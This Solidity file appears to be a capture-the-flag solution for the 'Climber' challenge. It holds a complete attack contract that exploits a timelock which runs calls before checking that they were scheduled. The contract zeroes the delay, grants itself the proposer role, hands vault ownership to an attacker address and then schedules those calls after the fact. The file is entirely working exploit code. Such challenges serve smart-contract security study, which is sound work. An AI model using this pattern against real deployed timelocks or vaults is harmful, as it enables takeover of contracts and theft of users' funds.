// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "../../climber/ClimberVault.sol";

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttack {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    IClimberTimelock private timelock;

    address private vault;
    address private attacker;

    constructor(
        address _timelock,
        address _vault,
        address _attacker
    ) {
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {
        // update delay to 0 to execute tasks instantly
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // grant the proposer role to this contract to be able to schedule tasks
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );

        // transfer ownership to the attacker
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        // schedule the above tasks through this contract
        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        salt = keccak256("SALT");

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
